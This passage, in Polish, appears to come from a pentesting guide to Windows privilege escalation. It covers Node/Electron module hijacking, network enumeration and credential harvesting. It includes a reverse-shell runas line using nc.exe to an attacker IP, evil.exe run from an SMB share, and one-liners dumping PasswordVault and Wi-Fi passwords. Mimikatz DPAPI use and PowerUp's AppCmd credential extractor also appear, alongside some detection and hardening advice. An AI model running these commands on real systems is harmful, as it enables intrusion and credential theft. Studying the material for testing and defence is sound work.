Więcej informacji o tym, jak wykorzystać tę kontrolę:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Przejęcie rozwiązywania modułów Node.js / Electron za pośrednictwem `C:\node_modules`

Jest to wariant **niekontrolowanej ścieżki wyszukiwania w Windows**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują import bezwzględny, taki jak `require("foo")`, a oczekiwanego modułu **brakuje**.<sup>[[20]](#references)</sup>

Node wyszukuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W systemie Windows wyszukiwanie może dotrzeć do katalogu głównego dysku, więc aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może sprawdzać kolejno:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **użytkownik o niskich uprawnieniach** może utworzyć `C:\node_modules`, może umieścić tam złośliwy plik `foo.js` (lub folder pakietu) i poczekać, aż proces **Node/Electron o wyższych uprawnieniach** spróbuje rozwiązać brakującą zależność. Payload zostanie uruchomiony w kontekście bezpieczeństwa procesu ofiary, co prowadzi do **LPE**, gdy proces docelowy działa jako administrator, jest uruchamiany przez zadanie harmonogramu z podwyższonymi uprawnieniami lub opakowującą go usługę albo działa jako automatycznie uruchamiana aplikacja desktopowa z podwyższonymi uprawnieniami.

Zdarza się to szczególnie często, gdy:

- zależność jest zadeklarowana w `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka innej firmy opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po błędzie
- pakiet usunięto z buildów produkcyjnych, pominięto podczas pakowania lub nie udało się go zainstalować
- podatne wywołanie `require()` znajduje się głęboko w drzewie zależności, a nie w głównym kodzie aplikacji

### Wyszukiwanie podatnych celów

Użyj **Procmon**, aby potwierdzić ścieżkę rozwiązywania modułów:<sup>[[23]](#references)</sup>

- Filtruj według `Process Name` = plik wykonywalny procesu docelowego (`node.exe`, plik EXE aplikacji Electron lub proces opakowujący)
- Filtruj według `Path` `contains` `node_modules`
- Skup się na `NAME NOT FOUND` i ostatnim pomyślnym otwarciu w `C:\node_modules`

Przydatne wzorce do wyszukiwania podczas przeglądu kodu w rozpakowanych plikach `.asar` lub źródłach aplikacji:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Eksploatacja

1. Zidentyfikuj **brakującą nazwę pakietu** za pomocą Procmon lub przeglądu kodu źródłowego.
2. Utwórz główny katalog wyszukiwania, jeśli jeszcze nie istnieje:

```powershell
mkdir C:\node_modules
```

3. Umieść moduł pod dokładnie oczekiwaną nazwą:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Uruchom aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a prawidłowy moduł nie będzie dostępny, Node może załadować `C:\node_modules\foo.js`.

Rzeczywiste przykłady brakujących modułów opcjonalnych pasujących do tego wzorca to `bluebird` i `utf-8-validate`, ale **technika** jest uniwersalna: znajdź dowolny **brakujący import bare**, który uprzywilejowany proces Windows Node/Electron rozwiąże.

### Pomysły na wykrywanie i utwardzanie zabezpieczeń

- Generuj alerty, gdy użytkownik tworzy `C:\node_modules` lub zapisuje tam nowe pliki/pakiety `.js`.
- Wyszukuj procesy o wysokim poziomie integralności odczytujące dane z `C:\node_modules\*`.
- Umieszczaj wszystkie zależności środowiska uruchomieniowego w pakiecie produkcyjnym i audytuj użycie `optionalDependencies`.
- Sprawdzaj kod firm trzecich pod kątem wzorców `try { require("...") } catch {}`, które ignorują błędy.
- Wyłączaj opcjonalne testy, jeśli biblioteka to umożliwia (na przykład niektóre wdrożenia `ws` mogą pominąć test legacy `utf-8-validate` za pomocą `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udziały

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### plik hosts

Sprawdź, czy w pliku hosts nie ma zakodowanych na stałe adresów innych znanych komputerów.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfejsy sieciowe i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otwarte porty

Sprawdź z zewnątrz, czy dostępne są **usługi objęte ograniczeniami**.

```bash
netstat -ano #Opened ports?
```

W przypadku lokalnego listenera skoreluj jego PID z właścicielem procesu, ścieżką pliku wykonywalnego oraz usługą lub zaplanowanym zadaniem, które go uruchamia. Usługa zdalnego dostępu może zapewnić dostęp jako jej użytkownik pulpitu tylko wtedy, gdy pozwalają na to mechanizmy uwierzytelniania i kontroli poleceń. Niestandardowa aplikacja TCP uruchomiona na koncie o wyższych uprawnieniach wymaga osobnej analizy: listener i ścieżka pliku binarnego to jedynie wskazówki, a uwierzytelniona ścieżka wykorzystująca błąd uszkodzenia pamięci wymaga analizy tego konkretnego pliku binarnego i dostępnych danych wejściowych. Jeśli wygląda na to, że ujawniony port należy do procesu systemowego, sprawdź [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), zanim przypiszesz mu usługę backendu; sama reguła przekierowania nie dowodzi, że miejsce docelowe jest osiągalne ani podatne na ataki.

### Tabela routingu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reguły zapory

[**Sprawdź tę stronę, aby poznać polecenia związane z zaporą**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej [poleceń do enumeracji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Plik binarny `bash.exe` można znaleźć również w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszej próbie nasłuchiwania na porcie za pomocą `nc.exe` pojawi się okno GUI z pytaniem, czy zapora ma zezwolić na używanie `nc`).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Aby łatwo uruchomić bash jako root, możesz użyć `--default-user root`

System plików `WSL` możesz przeglądać w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Konto Linux `root` w WSL samo w sobie nie nadaje uprawnień Administratora Windows. Jeśli bieżąca tożsamość Windows może odczytać system plików dystrybucji, sprawdź pliki historii powłoki (w tym `/root/.bash_history`) pod kątem poleceń, które mogły zapisać poświadczenia. Eskalacja nadal wymaga prawidłowego konta o wyższych uprawnieniach i dozwolonej metody uwierzytelniania. Układ `LocalState\rootfs` dotyczy starszych instalacji WSL; WSL 2 zwykle przechowuje dystrybucję na wirtualnym dysku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), dlatego najpierw ustal faktyczną dystrybucję i ścieżkę przechowywania. Podczas automatycznego wyliczania unikaj wyświetlania zawartości historii.

## Poświadczenia Windows

### Poświadczenia Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traktuj `DefaultUserName` i `DefaultDomainName` jako kontekst konta, a nie poświadczenia. Niepusta wartość `DefaultPassword` lub `AltDefaultPassword` oznacza, że w rejestrze znaleziono hasło w postaci jawnego tekstu. Jeśli `AutoAdminLogon=1`, ale nie można odczytać hasła w postaci jawnego tekstu, jest to jedynie wskazówka: [Sysinternals Autologon może przechowywać hasło jako sekret LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a zwykły odczyt rejestru nie pozwala ustalić, czy taki sekret istnieje ani czy można go odzyskać. Przed zgłoszeniem ujawnienia poświadczeń sprawdź prawa dostępu i rzeczywistą konfigurację logowania.

### Menedżer poświadczeń / Windows Vault

Z artykułu [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault przechowuje poświadczenia użytkowników używane przez **Windows** do **automatycznego logowania użytkowników** do serwerów, witryn i innych programów. Na początku może się wydawać, że użytkownicy mogą przechowywać poświadczenia do witryn takich jak Facebook, Twitter lub Gmail, aby przeglądarki logowały ich automatycznie, ale tak to nie działa.

Windows Vault przechowuje poświadczenia, których Windows może używać do automatycznego logowania użytkowników. Oznacza to, że każda **aplikacja Windows wymagająca poświadczeń, aby uzyskać dostęp do zasobu** (serwera lub witryny) **może korzystać z tego Credential Managera** i Windows Vault, używając zapisanych poświadczeń zamiast każdorazowego wpisywania przez użytkowników nazwy użytkownika i hasła.

O ile aplikacje nie współpracują z Credential Managerem, nie sądzę, by mogły używać poświadczeń do danego zasobu. Jeśli więc aplikacja ma korzystać z vaulta, powinna w jakiś sposób **komunikować się z menedżerem poświadczeń i pobierać z domyślnego vaulta poświadczenia do danego zasobu**.

Użyj `cmdkey`, aby wyświetlić poświadczenia zapisane na komputerze.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Następnie możesz użyć `runas` z opcją `/savecred`, aby użyć zapisanych poświadczeń. Poniższy przykład uruchamia zdalny plik binarny za pośrednictwem udziału SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Używanie `runas` z podanym zestawem danych uwierzytelniających.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Zwróć uwagę na mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub moduł [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje Windows UWP, Microsoft Edge i nowoczesne usługi systemowe przechowują tokeny uwierzytelniające oraz hasła w postaci jawnego tekstu w `PasswordVault` platformy Universal Windows Platform (UWP) (dostępnym również jako `Web Credentials` w `vaultcmd`). Ta przestrzeń przechowywania jest odizolowana dla każdej sesji i można ją odszyfrować natywnie bez uprawnień administratora ani `SeDebugPrivilege`.

Wykonaj to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie zapisane nazwy użytkowników oraz hasła w postaci jawnego tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** udostępnia metodę szyfrowania symetrycznego danych, wykorzystywaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, który znacząco zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzanego z danych logowania użytkownika**. W przypadku szyfrowania systemowego wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkownika, chronione za pomocą DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [identyfikator zabezpieczeń](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, znajdujący się w tym samym pliku co klucz główny chroniący klucze prywatne użytkownika**, składa się zazwyczaj z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, przez co nie można wyświetlić jego zawartości za pomocą polecenia `dir` w CMD, choć można to zrobić w PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Możesz użyć **modułu mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby je odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zazwyczaj znajdują się w:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane w **skryptach** i zadaniach automatyzacji jako wygodny sposób przechowywania zaszyfrowanych danych uwierzytelniających. Są one chronione za pomocą **DPAPI**, co zwykle oznacza, że można je odszyfrować tylko przy użyciu tego samego użytkownika na tym samym komputerze, na którym zostały utworzone.

Wyeksportowane poświadczenie może mieć dowolną nazwę pliku lub ścieżkę `.xml`. Jeśli skrypt lub inwentaryzacja plików wskazuje taki plik, ustal rzeczywisty katalog profilu konta, zamiast zakładać, że jest to `C:\Users`: [system Windows może umieszczać profile w innych lokalizacjach](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Plik, który można odczytać, jest jedynie wskazówką; [funkcja Windows `Export-Clixml` wiąże zaszyfrowane poświadczenie z użytkownikiem i komputerem, z których zostało wyeksportowane](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a odzyskane konto musi niezależnie posiadać wymagane uprawnienia do docelowej usługi. Najpierw sprawdź ścieżki i ACL, nie wyświetlając podczas standardowej enumeracji zaszyfrowanych ani jawnych wartości.

Aby **odszyfrować** poświadczenia PS z pliku, który je zawiera, możesz wykonać:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Ostatnio uruchamiane polecenia

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menedżer poświadczeń Pulpitu zdalnego**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Użyj modułu Mimikatz `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować dowolne pliki .rdg**\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z pamięci za pomocą modułu Mimikatz `sekurlsa::dpapi`

**mRemoteNG używa innego magazynu połączeń.** Sprawdź czytelne pliki XML w `%APPDATA%\mRemoteNG` i folderze Dokumenty użytkownika, w tym pliki o zwykłych nazwach, takich jak `config.xml`. Zidentyfikuj schemat połączeń i zaszyfrowane atrybuty `Password`, zanim uznasz plik XML za potencjalne źródło danych uwierzytelniających. Zapisana wartość nie jest hasłem DPAPI/RDCMan; jej odzyskanie zależy od ustawień szyfrowania pliku oraz od tego, czy użyto własnego hasła głównego. Podczas szeroko zakrojonego wyszukiwania unikaj wyświetlania zaszyfrowanych wartości.

**Eksporty profili Remote Desktop Plus** również mogą być czytelne w katalogach użytkowników lub współdzielonym folderze administracyjnym. Starszy eksport `profiles.xml` zawiera wpisy `Data/Profile` z elementami `ProfileName`, `Password` i `Secure`. Niepusty element hasła traktuj jako potencjalne źródło danych uwierzytelniających — nie wyświetlaj go ani nie zakładaj, że zawiera zwykły tekst: [dostawca podaje](https://www.donkz.nl/), że ochrona profilu może być powiązana z kontem i komputerem, na których go utworzono, lub skonfigurowana w mniej restrykcyjny sposób. Zanim na nim polegasz, potwierdź pochodzenie pliku i warunki odzyskania danych.

### Sticky Notes

Ludzie czasami zapisują hasła i inne informacje w aplikacjach z karteczkami. Aplikacja Sticky Notes firmy Microsoft, instalowana jako pakiet, zwykle przechowuje notatki w `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starsze lub inne aplikacje mogą korzystać z innych magazynów w profilu użytkownika, w tym z LevelDB. Zidentyfikuj zainstalowaną aplikację i format przechowywania danych, zanim uznasz brak pliku SQLite za dowód braku notatek.

Jeśli Sticky Notes korzysta z dziennika zapisu z wyprzedzeniem SQLite, sama kopia `plum.sqlite` może nie zawierać ostatnio zatwierdzonych notatek. Zachowaj pasujący plik `plum.sqlite-wal` wraz ze spójną kopią bazy danych, a jeśli jest dostępny, dołącz również `plum.sqlite-shm`; indeks pamięci współdzielonej można odbudować, ale plik WAL jest częścią trwałego stanu bazy danych. Zobacz [dokumentację WAL SQLite](https://www.sqlite.org/wal.html). Notatka zawierająca nazwę konta lub hasło jest jedynie potencjalnym źródłem danych uwierzytelniających: osobno zweryfikuj konto, dozwolony dostęp i ponowne użycie hasła. Zaszyfrowany wpis menedżera haseł wymaga ponadto właściwego klucza deszyfrującego oraz interpretacji właściwej dla danej aplikacji, zanim będzie można uznać go za dowód logowania z wyższymi uprawnieniami.

### AppCmd.exe

**Pamiętaj, że do odzyskania haseł z AppCmd.exe musisz być Administratorem i uruchomić program na poziomie High Integrity.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano pewne **dane uwierzytelniające**, które można **odzyskać**.

Ten kod został zaczerpnięty z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Sprawdź, czy plik `C:\Windows\CCM\SCClient.exe` istnieje .\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Pliki i rejestr (dane uwierzytelniające)

### Artefakty danych uwierzytelniających w rejestrze narzędzi wsparcia

Niektóre starsze instalacje narzędzi do zdalnego wsparcia zachowują nazwy wartości związanych z hasłami w stałych kluczach rejestru aplikacji. Na przykład `SecurityPasswordAES` w TeamViewer identyfikowało skonfigurowane statyczne hasło sesji w wersjach wcześniejszych niż 9, zgodnie z [wyjaśnieniem dostawcy dotyczącym klucza rejestru](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Znacznik będący nazwą wartości to jedynie wskazówka do weryfikacji: przed oceną danego poświadczenia sprawdź zainstalowaną wersję, czytelność danych wartości, ich format i bieżące zachowanie uwierzytelniania. Przejście od hasła do zdalnego wsparcia do bardziej uprzywilejowanego konta Windows wymaga również faktycznego ponownego użycia hasła oraz uprawnień do tego konta. Nie umieszczaj tekstu zaszyfrowanego ani odzyskanych haseł w rutynowych wynikach enumeracji.

### Udostępnione arkusze kalkulacyjne z chronionymi arkuszami

Jeśli podejrzewasz, że czytelny, udostępniony skoroszyt zawiera dane kont, odróżnij **szyfrowanie pliku** od ochrony arkusza lub ukrytych kolumn. [Microsoft informuje](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), że ochrona arkusza kontroluje edycję i nie jest funkcją zabezpieczeń; sama w sobie nie oznacza, że zawartość skoroszytu jest zaszyfrowana. Analizuj wyłącznie pliki, do których masz uprawnienia i które są istotne, a podczas szerokiej enumeracji nie wyświetlaj potencjalnych sekretów. Sama dostępna ścieżka do pliku `.xlsx`, chroniony arkusz ani ukryta kolumna nie dowodzą, że istnieją tam dane uwierzytelniające ani że jakiekolwiek konto ma wyższe uprawnienia; osobno zweryfikuj rzeczywiste dane i bieżące uprawnienia konta.

### Zachowane poprawki zmian na serwerze CI

Serwer CI może zachowywać przesłane zmiany w kodzie źródłowym w swoim katalogu danych nawet po zakończeniu kompilacji. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html), że `system/changes` służy do przechowywania zmian zdalnych uruchomień; katalog danych można skonfigurować i nie musi znajdować się w `ProgramData`. Czytelna poprawka może zachować usunięte lub dodane odwołania do pliku poświadczeń, klucza szyfrującego albo skryptu używającego obu tych elementów. Na przykład przepływ `ConvertTo-SecureString -Key` w PowerShell wymaga zarówno klucza AES, jak i zaszyfrowanego ciągu znaków; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), że klucz jest przekazywany oddzielnie. Najpierw sprawdź wyłącznie nazwy dostępnych poprawek, a następnie, jeśli masz do tego uprawnienia, przeanalizuj odpowiednią zawartość bez wyświetlania sekretów w rutynowych wynikach enumeracji. Sama ścieżka do poprawki, zaszyfrowana wartość ani odwołanie do klucza nie dowodzą, że poświadczenie jest prawidłowe lub zapewnia dostęp z wyższymi uprawnieniami. Ogranicz dostęp do katalogu danych za pomocą ACL i nie umieszczaj sekretów w zmianach kompilacji.

### Niestandardowa rotacja hasła lokalnego administratora

Własny mechanizm rotacji haseł może przechowywać zaszyfrowane hasło lokalnego administratora w lokalnej usłudze, a dane uwierzytelniające do magazynu danych — w czytelnym pliku `.env` lub obok pliku binarnego aktualizatora. Łącznie sprawdź zaplanowane zadanie aktualizatora, jego konto, ACL konfiguracji, nasłuchujący port i uprawnienia do magazynu danych. Magazyn danych dostępny wyłącznie przez loopback nadal jest osiągalny dla lokalnego użytkownika mającego prawidłowe dane uwierzytelniające, ale samo uwierzytelnienie nie dowodzi uprawnień do odczytu odpowiednich rekordów. Jeśli materiał inicjujący szyfrowanie lub klucz jest dostępny obok tekstu zaszyfrowanego, przed uznaniem szyfrowania za wiarygodne sprawdź dokładny sposób wyprowadzania klucza. Schemat, który deterministycznie wyprowadza klucz AES z ujawnionego ziarna przy użyciu Go [`math/rand`](https://pkg.go.dev/math/rand), nie nadaje się do ochrony tego hasła; dokumentacja Go wskazuje, że ten pakiet nie jest przeznaczony do losowości istotnej z punktu widzenia bezpieczeństwa. Zanim uznasz odzyskane hasło za ścieżkę eskalacji uprawnień, potwierdź, że jest aktualne i należy do konta należącego do lokalnej grupy Administrators. Samo zaplanowane zadanie, ścieżka `.env` ani zaszyfrowany blob nie dowodzą żadnego z tych warunków. Nie umieszczaj haseł ani materiału kluczowego w rutynowych wynikach enumeracji.

Do zarządzania hasłami lokalnych administratorów używaj [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Kontrola dostępu do pamięci w katalogu lub Entra różni się od kontroli dostępu do niestandardowego lokalnego magazynu danych; podobnie [role Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) określają, czy uwierzytelniony użytkownik magazynu danych może odczytać konkretny indeks.

### Archiwa wtyczek serwera Java i ponowne użycie poświadczeń

Niektóre wtyczki serwerów Java są dystrybuowane jako archiwa JAR w katalogu `plugins` serwera. Czytelna, niestandardowa wtyczka może zawierać konfigurację lub kod bajtowy z osadzonym poświadczeniem usługi. Analizuj archiwum wyłącznie za zgodą i nie umieszczaj odzyskanych sekretów w rutynowych wynikach enumeracji. Sama ścieżka do wtyczki nie dowodzi, że sekret istnieje, a odzyskane hasło usługi prowadzi do wyższych uprawnień tylko wtedy, gdy jest również prawidłowe dla konta z wyższymi uprawnieniami. Sprawdź odpowiednie ACL plików i zastąp ponownie używane poświadczenia odrębnymi sekretami. Układ katalogów opisano w [przewodniku instalacji wtyczek PaperMC](https://docs.papermc.io/paper/adding-plugins/), a zawartość archiwów — w [dokumentacji JAR firmy Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Poświadczenia wbudowanej bazy danych Openfire

Instalacja Openfire korzystająca z wbudowanej bazy danych może przechowywać plik `openfire.script` w katalogu `Openfire\embedded-db`. Jeśli bieżące konto może go odczytać, sprawdź łącznie rekordy `OFUSER` i właściwość `passwordKey`. Dokumentacja [dostawcy użytkowników Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) wskazuje, że hasła mogą być przechowywane jako zwykły tekst lub szyfrowane kluczem znajdującym się we wspomnianej właściwości. Odzyskane hasło ma znaczenie dla eskalacji uprawnień tylko wtedy, gdy nadal jest prawidłowe dla bardziej uprzywilejowanej tożsamości; sama nazwa pliku nie dowodzi ani dostępu do odczytu, ani ponownego użycia poświadczenia. Traktuj tę ścieżkę jako wskazówkę inwentaryzacyjną i nie umieszczaj zawartości bazy danych ani poświadczeń w rutynowych wynikach enumeracji.

